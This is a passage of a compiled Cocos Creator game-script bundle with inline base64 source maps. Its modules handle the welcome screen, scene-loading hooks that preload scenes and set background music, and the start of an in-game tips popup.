ZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gTGVhcm4gQXR0cmlidXRlOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyBMZWFybiBsaWZlLWN5Y2xlIGNhbGxiYWNrczpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuXHJcblxyXG5cclxuaW1wb3J0IHtJQ29tbWFuZH0gZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9mYWNhZGUvSUNvbW1hbmRcIjtcclxuaW1wb3J0IHtNdXNpY1BhdGhzfSBmcm9tIFwiLi4vY29uZmlnL011c2ljUGF0aHNcIjtcclxuaW1wb3J0IHtNdXNpY30gZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9hdWRpby9NdXNpY1wiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzcyhcIkNsaWNrU291bmRDb21tYW5kXCIpXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIENsaWNrU291bmRDb21tYW5kIGltcGxlbWVudHMgSUNvbW1hbmQge1xyXG5cclxuICAgIGFzeW5jIGV4ZWN1dGUgKC4uLmFyZ3MpOlByb21pc2V7XHJcbiAgICAgICAgbGV0IGV2ZW50ID0gYXJnc1swXTtcclxuICAgICAgICBsZXQgZGF0YSA9IGFyZ3NbMV07XHJcbiAgICAgICAgLyoqIOi/memHjOWPr+S7peWBmuS4gOS6m+i/h+a7pOaIlueJueauiuWkhOeQhiAqL1xyXG4gICAgICAgIE11c2ljLnBsYXlTRlgoTXVzaWNQYXRocy5DbGlja1VJKTtcclxuICAgIH1cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/welcome/Welcome.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '9e3f6FMdypHP65fD2gjB7kj', 'Welcome');
// script/app/welcome/Welcome.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Facade_1 = require("../../../framework/facade/Facade");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var Welcome = /** @class */ (function (_super) {
    __extends(Welcome, _super);
    function Welcome() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.bgNode = null;
        return _this;
    }
    Welcome.prototype.onLoad = function () {
        var _this = this;
        console.log("xxx1");
        cc.warn = function () { };
        var promises = [];
        promises.push(Facade_1.default.executeCommand("LoadingCommand"));
        console.log("xxx2");
        promises.push(new Promise(function (resolve) {
            _this.node.runAction(cc.sequence(cc.delayTime(2), cc.callFunc(function () { return resolve(); })));
        }));
        console.log("xxx3");
        Promise.all(promises).then(function () {
            cc.loader.loadRes("prefab/HomeScene", cc.Prefab, function (error, resource) {
                if (error == null) {
                    var homeScene = cc.instantiate(resource);
                    Facade_1.default.canvasNode.addChild(homeScene);
                    _this.bgNode.destroy();
                }
                else {
                    console.error(error);
                }
            });
        });
        console.log("xxx4");
    };
    __decorate([
        property(cc.Node)
    ], Welcome.prototype, "bgNode", void 0);
    Welcome = __decorate([
        ccclass
    ], Welcome);
    return Welcome;
}(cc.Component));
exports.default = Welcome;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL3dlbGNvbWUvV2VsY29tZS50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBRUEsMkRBQXNEO0FBRWhELElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRzFDO0lBQXFDLDJCQUFZO0lBQWpEO1FBQUEscUVBOEJDO1FBM0JHLFlBQU0sR0FBVyxJQUFJLENBQUM7O0lBMkIxQixDQUFDO0lBekJHLHdCQUFNLEdBQU47UUFBQSxpQkF3QkM7UUF2QkcsT0FBTyxDQUFDLEdBQUcsQ0FBQyxNQUFNLENBQUMsQ0FBQTtRQUVuQixFQUFFLENBQUMsSUFBSSxHQUFHLGNBQUssQ0FBQyxDQUFDO1FBQ2pCLElBQUksUUFBUSxHQUFHLEVBQUUsQ0FBQztRQUVsQixRQUFRLENBQUMsSUFBSSxDQUFDLGdCQUFNLENBQUMsY0FBYyxDQUFDLGdCQUFnQixDQUFDLENBQUMsQ0FBQztRQUN2RCxPQUFPLENBQUMsR0FBRyxDQUFDLE1BQU0sQ0FBQyxDQUFBO1FBQ25CLFFBQVEsQ0FBQyxJQUFJLENBQUMsSUFBSSxPQUFPLENBQUMsVUFBQSxPQUFPO1lBQzdCLEtBQUksQ0FBQyxJQUFJLENBQUMsU0FBUyxDQUFDLEVBQUUsQ0FBQyxRQUFRLENBQUMsRUFBRSxDQUFDLFNBQVMsQ0FBQyxDQUFDLENBQUMsRUFBRSxFQUFFLENBQUMsUUFBUSxDQUFDLGNBQUksT0FBQSxPQUFPLEVBQUUsRUFBVCxDQUFTLENBQUMsQ0FBQyxDQUFDLENBQUM7UUFDbEYsQ0FBQyxDQUFDLENBQUMsQ0FBQztRQUNKLE9BQU8sQ0FBQyxHQUFHLENBQUMsTUFBTSxDQUFDLENBQUE7UUFDbkIsT0FBTyxDQUFDLEdBQUcsQ0FBQyxRQUFRLENBQUMsQ0FBQyxJQUFJLENBQUM7WUFDdkIsRUFBRSxDQUFDLE1BQU0sQ0FBQyxPQUFPLENBQUMsa0JBQWtCLEVBQUUsRUFBRSxDQUFDLE1BQU0sRUFBRSxVQUFDLEtBQUssRUFBRSxRQUFRO2dCQUM3RCxJQUFJLEtBQUssSUFBSSxJQUFJLEVBQUM7b0JBQ2QsSUFBSSxTQUFTLEdBQUcsRUFBRSxDQUFDLFdBQVcsQ0FBQyxRQUFRLENBQUMsQ0FBQztvQkFDekMsZ0JBQU0sQ0FBQyxVQUFVLENBQUMsUUFBUSxDQUFDLFNBQVMsQ0FBQyxDQUFDO29CQUN0QyxLQUFJLENBQUMsTUFBTSxDQUFDLE9BQU8sRUFBRSxDQUFDO2lCQUN6QjtxQkFBSztvQkFDRixPQUFPLENBQUMsS0FBSyxDQUFDLEtBQUssQ0FBQyxDQUFDO2lCQUN4QjtZQUNMLENBQUMsQ0FBQyxDQUFDO1FBQ1AsQ0FBQyxDQUFDLENBQUM7UUFDSCxPQUFPLENBQUMsR0FBRyxDQUFDLE1BQU0sQ0FBQyxDQUFBO0lBQ3ZCLENBQUM7SUExQkQ7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQzsyQ0FDSTtJQUhMLE9BQU87UUFEM0IsT0FBTztPQUNhLE9BQU8sQ0E4QjNCO0lBQUQsY0FBQztDQTlCRCxBQThCQyxDQTlCb0MsRUFBRSxDQUFDLFNBQVMsR0E4QmhEO2tCQTlCb0IsT0FBTyIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQgTmV0d29yayBmcm9tIFwiLi4vbmV0d29yay9OZXR3b3JrXCI7XHJcbmltcG9ydCBGYWNhZGUgZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9mYWNhZGUvRmFjYWRlXCI7XHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIFdlbGNvbWUgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgYmdOb2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIG9uTG9hZCAoKSB7XHJcbiAgICAgICAgY29uc29sZS5sb2coXCJ4eHgxXCIpXHJcblxyXG4gICAgICAgIGNjLndhcm4gPSAoKT0+e307XHJcbiAgICAgICAgbGV0IHByb21pc2VzID0gW107XHJcblxyXG4gICAgICAgIHByb21pc2VzLnB1c2goRmFjYWRlLmV4ZWN1dGVDb21tYW5kKFwiTG9hZGluZ0NvbW1hbmRcIikpO1xyXG4gICAgICAgIGNvbnNvbGUubG9nKFwieHh4MlwiKVxyXG4gICAgICAgIHByb21pc2VzLnB1c2gobmV3IFByb21pc2UocmVzb2x2ZSA9PiB7XHJcbiAgICAgICAgICAgIHRoaXMubm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2MuZGVsYXlUaW1lKDIpLCBjYy5jYWxsRnVuYygoKT0+cmVzb2x2ZSgpKSkpO1xyXG4gICAgICAgIH0pKTtcclxuICAgICAgICBjb25zb2xlLmxvZyhcInh4eDNcIilcclxuICAgICAgICBQcm9taXNlLmFsbChwcm9taXNlcykudGhlbigoKT0+e1xyXG4gICAgICAgICAgICBjYy5sb2FkZXIubG9hZFJlcyhcInByZWZhYi9Ib21lU2NlbmVcIiwgY2MuUHJlZmFiLCAoZXJyb3IsIHJlc291cmNlKSA9PiB7XHJcbiAgICAgICAgICAgICAgICBpZiAoZXJyb3IgPT0gbnVsbCl7XHJcbiAgICAgICAgICAgICAgICAgICAgbGV0IGhvbWVTY2VuZSA9IGNjLmluc3RhbnRpYXRlKHJlc291cmNlKTtcclxuICAgICAgICAgICAgICAgICAgICBGYWNhZGUuY2FudmFzTm9kZS5hZGRDaGlsZChob21lU2NlbmUpO1xyXG4gICAgICAgICAgICAgICAgICAgIHRoaXMuYmdOb2RlLmRlc3Ryb3koKTtcclxuICAgICAgICAgICAgICAgIH1lbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKGVycm9yKTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgfSk7XHJcbiAgICAgICAgY29uc29sZS5sb2coXCJ4eHg0XCIpXHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/interceptor/LoadSceneIntercetor.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '852b8t92dhL855GnoTwHCmW', 'LoadSceneIntercetor');
// script/app/interceptor/LoadSceneIntercetor.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
var Facade_1 = require("../../../framework/facade/Facade");
var MusicPaths_1 = require("../config/MusicPaths");
var Music_1 = require("../../../framework/audio/Music");
var NetworkConfig_1 = require("../config/NetworkConfig");
var Network_1 = require("../network/Network");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var LoadSceneIntercetor = /** @class */ (function () {
    function LoadSceneIntercetor() {
    }
    /**
     * 加载场景之前处理
     * */
    LoadSceneIntercetor.prototype.preHandle = function () {
        var args = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            args[_i] = arguments[_i];
        }
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        var sceneName;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    sceneName = args[0];
                                    if (!(sceneName == "GameScene")) return [3 /*break*/, 2];
                                    return [4 /*yield*/, Facade_1.default.executeCommand("PreloadGameSceneCommand")];
                                case 1:
                                    _a.sent();
                                    return [3 /*break*/, 3];
                                case 2:
                                    if (sceneName == "HomeScene") {
                                        if (NetworkConfig_1.NetworkConfig.connectServer) {
                                            Network_1.default.pushStorage();
                                        }
                                    }
                                    _a.label = 3;
                                case 3:
                                    resolve(true);
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            });
        });
    };
    /**
     * 加载场景完成之后处理
     * */
    LoadSceneIntercetor.prototype.postHandle = function (res) {
        var args = [];
        for (var _i = 1; _i < arguments.length; _i++) {
            args[_i - 1] = arguments[_i];
        }
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        var sceneName;
                        return __generator(this, function (_a) {
                            sceneName = args[0];
                            if (sceneName == "HomeScene") {
                                /** 背景音乐 */
                                // Music.setBgm(MusicPaths.HomeBg);
                                /** 加载子工程好友排行数据 */
                                /** 显示新手引导 */
                                /* let prefab = await cc.loader.loadResAwait("prefab/newbie", cc.Prefab);
                                 let node = cc.instantiate(prefab);
                                 let homeNode = Facade.canvasNode.getChildByName("HomeScene");
                                 let startGameNode = homeNode.getChildByName("startGame");
                                 node.position = startGameNode.position;
                                 node.setParent(Facade.canvasNode);
                                 LifeCycle.onDestroyFollow(node, homeNode);*/
                            }
                            else if (sceneName == "GameScene") {
                                /** 背景音乐 */
                                Music_1.Music.setBgm(MusicPaths_1.MusicPaths.GameBg);
                            }
                            else if (sceneName == "GameOverScene") {
                                // Music.stopBGM();
                            }
                            resolve();
                            return [2 /*return*/];
                        });
                    }); })];
            });
        });
    };
    LoadSceneIntercetor = __decorate([
        ccclass
    ], LoadSceneIntercetor);
    return LoadSceneIntercetor;
}());
exports.default = LoadSceneIntercetor;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2ludGVyY2VwdG9yL0xvYWRTY2VuZUludGVyY2V0b3IudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7O0FBQUEsb0JBQW9CO0FBQ3BCLGlGQUFpRjtBQUNqRix5RkFBeUY7QUFDekYsbUJBQW1CO0FBQ25CLDJGQUEyRjtBQUMzRixtR0FBbUc7QUFDbkcsOEJBQThCO0FBQzlCLDJGQUEyRjtBQUMzRixtR0FBbUc7O0FBR25HLDJEQUFzRDtBQUN0RCxtREFBZ0Q7QUFDaEQsd0RBQXFEO0FBQ3JELHlEQUFzRDtBQUN0RCw4Q0FBeUM7QUFFbkMsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFHMUM7SUFBQTtJQStDQSxDQUFDO0lBN0NHOztTQUVLO0lBQ0MsdUNBQVMsR0FBZjtRQUFnQixjQUFPO2FBQVAsVUFBTyxFQUFQLHFCQUFPLEVBQVAsSUFBTztZQUFQLHlCQUFPOzt1Q0FBRSxPQUFPOzs7Z0JBQzVCLHNCQUFPLElBQUksT0FBTyxDQUFDLFVBQU0sT0FBTyxFQUFFLE1BQU07Ozs7O29DQUNoQyxTQUFTLEdBQUcsSUFBSSxDQUFDLENBQUMsQ0FBQyxDQUFDO3lDQUNwQixDQUFBLFNBQVMsSUFBSSxXQUFXLENBQUEsRUFBeEIsd0JBQXdCO29DQUN4QixxQkFBTSxnQkFBTSxDQUFDLGNBQWMsQ0FBQyx5QkFBeUIsQ0FBQyxFQUFBOztvQ0FBdEQsU0FBc0QsQ0FBQzs7O29DQUNyRCxJQUFJLFNBQVMsSUFBSSxXQUFXLEVBQUM7d0NBQy9CLElBQUksNkJBQWEsQ0FBQyxhQUFhLEVBQUM7NENBQzVCLGlCQUFPLENBQUMsV0FBVyxFQUFFLENBQUM7eUNBQ3pCO3FDQUNKOzs7b0NBQ0QsT0FBTyxDQUFDLElBQUksQ0FBQyxDQUFDOzs7O3lCQUNqQixDQUFDLEVBQUM7OztLQUNOO0lBQ0Q7O1NBRUs7SUFDQyx3Q0FBVSxHQUFoQixVQUFpQixHQUFPO1FBQUUsY0FBTzthQUFQLFVBQU8sRUFBUCxxQkFBTyxFQUFQLElBQU87WUFBUCw2QkFBTzs7dUNBQUUsT0FBTzs7O2dCQUN0QyxzQkFBTyxJQUFJLE9BQU8sQ0FBQyxVQUFPLE9BQU8sRUFBRSxNQUFNOzs7NEJBQ2pDLFNBQVMsR0FBRyxJQUFJLENBQUMsQ0FBQyxDQUFDLENBQUM7NEJBQ3hCLElBQUksU0FBUyxJQUFJLFdBQVcsRUFBQztnQ0FDekIsV0FBVztnQ0FDWCxtQ0FBbUM7Z0NBQ25DLGtCQUFrQjtnQ0FFbEIsYUFBYTtnQ0FDZDs7Ozs7OzZFQU02Qzs2QkFFL0M7aUNBQUssSUFBSSxTQUFTLElBQUksV0FBVyxFQUFDO2dDQUMvQixXQUFXO2dDQUNYLGFBQUssQ0FBQyxNQUFNLENBQUMsdUJBQVUsQ0FBQyxNQUFNLENBQUMsQ0FBQzs2QkFDbkM7aUNBQUssSUFBSSxTQUFTLElBQUksZUFBZSxFQUFDO2dDQUNuQyxtQkFBbUI7NkJBQ3RCOzRCQUNELE9BQU8sRUFBRSxDQUFDOzs7eUJBQ2IsQ0FBQyxFQUFDOzs7S0FDTjtJQTlDZ0IsbUJBQW1CO1FBRHZDLE9BQU87T0FDYSxtQkFBbUIsQ0ErQ3ZDO0lBQUQsMEJBQUM7Q0EvQ0QsQUErQ0MsSUFBQTtrQkEvQ29CLG1CQUFtQiIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIi8vIExlYXJuIFR5cGVTY3JpcHQ6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyBMZWFybiBBdHRyaWJ1dGU6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vIExlYXJuIGxpZmUtY3ljbGUgY2FsbGJhY2tzOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG5cclxuaW1wb3J0IHtJQ29tbWFuZEludGVyY2VwdG9yfSBmcm9tIFwiLi4vLi4vLi4vZnJhbWV3b3JrL2ludGVyY2VwdG9yL0NvbW1hbmRJbnRlcmNlcHRvclwiO1xyXG5pbXBvcnQgRmFjYWRlIGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvZmFjYWRlL0ZhY2FkZVwiO1xyXG5pbXBvcnQge011c2ljUGF0aHN9IGZyb20gXCIuLi9jb25maWcvTXVzaWNQYXRoc1wiO1xyXG5pbXBvcnQge011c2ljfSBmcm9tIFwiLi4vLi4vLi4vZnJhbWV3b3JrL2F1ZGlvL011c2ljXCI7XHJcbmltcG9ydCB7TmV0d29ya0NvbmZpZ30gZnJvbSBcIi4uL2NvbmZpZy9OZXR3b3JrQ29uZmlnXCI7XHJcbmltcG9ydCBOZXR3b3JrIGZyb20gXCIuLi9uZXR3b3JrL05ldHdvcmtcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgTG9hZFNjZW5lSW50ZXJjZXRvciBpbXBsZW1lbnRzIElDb21tYW5kSW50ZXJjZXB0b3Ige1xyXG5cclxuICAgIC8qKlxyXG4gICAgICog5Yqg6L295Zy65pmv5LmL5YmN5aSE55CGXHJcbiAgICAgKiAqL1xyXG4gICAgYXN5bmMgcHJlSGFuZGxlKC4uLmFyZ3MpOlByb21pc2V7XHJcbiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKGFzeW5jKHJlc29sdmUsIHJlamVjdCkgPT4ge1xyXG4gICAgICAgICAgICBsZXQgc2NlbmVOYW1lID0gYXJnc1swXTtcclxuICAgICAgICAgICAgaWYgKHNjZW5lTmFtZSA9PSBcIkdhbWVTY2VuZVwiKXtcclxuICAgICAgICAgICAgICAgIGF3YWl0IEZhY2FkZS5leGVjdXRlQ29tbWFuZChcIlByZWxvYWRHYW1lU2NlbmVDb21tYW5kXCIpO1xyXG4gICAgICAgICAgICB9ZWxzZSBpZiAoc2NlbmVOYW1lID09IFwiSG9tZVNjZW5lXCIpe1xyXG4gICAgICAgICAgICAgICAgaWYgKE5ldHdvcmtDb25maWcuY29ubmVjdFNlcnZlcil7XHJcbiAgICAgICAgICAgICAgICAgICAgTmV0d29yay5wdXNoU3RvcmFnZSgpO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIHJlc29sdmUodHJ1ZSk7XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcbiAgICAvKipcclxuICAgICAqIOWKoOi9veWcuuaZr+WujOaIkOS5i+WQjuWkhOeQhlxyXG4gICAgICogKi9cclxuICAgIGFzeW5jIHBvc3RIYW5kbGUocmVzOmFueSwgLi4uYXJncyk6UHJvbWlzZXtcclxuICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoYXN5bmMgKHJlc29sdmUsIHJlamVjdCkgPT4ge1xyXG4gICAgICAgICAgICBsZXQgc2NlbmVOYW1lID0gYXJnc1swXTtcclxuICAgICAgICAgICAgaWYgKHNjZW5lTmFtZSA9PSBcIkhvbWVTY2VuZVwiKXtcclxuICAgICAgICAgICAgICAgIC8qKiDog4zmma/pn7PkuZAgKi9cclxuICAgICAgICAgICAgICAgIC8vIE11c2ljLnNldEJnbShNdXNpY1BhdGhzLkhvbWVCZyk7XHJcbiAgICAgICAgICAgICAgICAvKiog5Yqg6L295a2Q5bel56iL5aW95Y+L5o6S6KGM5pWw5o2uICovXHJcblxyXG4gICAgICAgICAgICAgICAgLyoqIOaYvuekuuaWsOaJi+W8leWvvCAqL1xyXG4gICAgICAgICAgICAgICAvKiBsZXQgcHJlZmFiID0gYXdhaXQgY2MubG9hZGVyLmxvYWRSZXNBd2FpdChcInByZWZhYi9uZXdiaWVcIiwgY2MuUHJlZmFiKTtcclxuICAgICAgICAgICAgICAgIGxldCBub2RlID0gY2MuaW5zdGFudGlhdGUocHJlZmFiKTtcclxuICAgICAgICAgICAgICAgIGxldCBob21lTm9kZSA9IEZhY2FkZS5jYW52YXNOb2RlLmdldENoaWxkQnlOYW1lKFwiSG9tZVNjZW5lXCIpO1xyXG4gICAgICAgICAgICAgICAgbGV0IHN0YXJ0R2FtZU5vZGUgPSBob21lTm9kZS5nZXRDaGlsZEJ5TmFtZShcInN0YXJ0R2FtZVwiKTtcclxuICAgICAgICAgICAgICAgIG5vZGUucG9zaXRpb24gPSBzdGFydEdhbWVOb2RlLnBvc2l0aW9uO1xyXG4gICAgICAgICAgICAgICAgbm9kZS5zZXRQYXJlbnQoRmFjYWRlLmNhbnZhc05vZGUpO1xyXG4gICAgICAgICAgICAgICAgTGlmZUN5Y2xlLm9uRGVzdHJveUZvbGxvdyhub2RlLCBob21lTm9kZSk7Ki9cclxuXHJcbiAgICAgICAgICAgIH1lbHNlIGlmIChzY2VuZU5hbWUgPT0gXCJHYW1lU2NlbmVcIil7XHJcbiAgICAgICAgICAgICAgICAvKiog6IOM5pmv6Z+z5LmQICovXHJcbiAgICAgICAgICAgICAgICBNdXNpYy5zZXRCZ20oTXVzaWNQYXRocy5HYW1lQmcpO1xyXG4gICAgICAgICAgICB9ZWxzZSBpZiAoc2NlbmVOYW1lID09IFwiR2FtZU92ZXJTY2VuZVwiKXtcclxuICAgICAgICAgICAgICAgIC8vIE11c2ljLnN0b3BCR00oKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICByZXNvbHZlKCk7XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/tips/ShowTipsCommand.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '5a011mWwutAHI4SKXF9o6cQ', 'ShowTipsCommand');
// script/app/tips/ShowTipsCommand.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Extend_1 = require("../../../framework/extend/Extend");
var View_1 = require("../../../framework/component/View");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var ShowTipsCommand = /** @class */ (function () {
    function ShowTipsCommand() {
    }
    ShowTipsCommand.prototype.execute = function () {
        var args = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            args[_i] = arguments[_i];
        }
        return __awaiter(this, void 0, Promise, function () {
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) {
                        cc.loader.loadRes('prefab/tips', cc.Prefab, function (error, resource) {
                            if (error == null) {
                                var node_1 = cc.instantiate(resource);
                                var titleLabel = node_1.getChildByName('title').getComponent(cc.RichText);
                                var string = args[0] || "您忘记传参数喽";
                                titleLabel.string = "<b><outline color=#1e1e1e width=3>" + string.replace(">", "》").replace("<", "《") + "</outline></b>";
                                if (cc.director.getScene()) {
                                    cc.director.getScene().addChild(node_1);
                                    node_1.getComponent(cc.Layout).updateLayout();
                                    node_1.position = cc.v2(cc.view.getVisibleSize().width / 2, cc.view.getVisibleSize().height);
                                    var duration = Extend_1.ext.isIphoneX ? 0.3 : 0.2;
                                    var y = Extend_1.ext.isIphoneX ? cc.view.getVisibleSize().height - node_1.height - View_1.default.IPHONEX_TOP_BLACK_HEIGHT : cc.view.getVisibleSize().height - node_1.height;
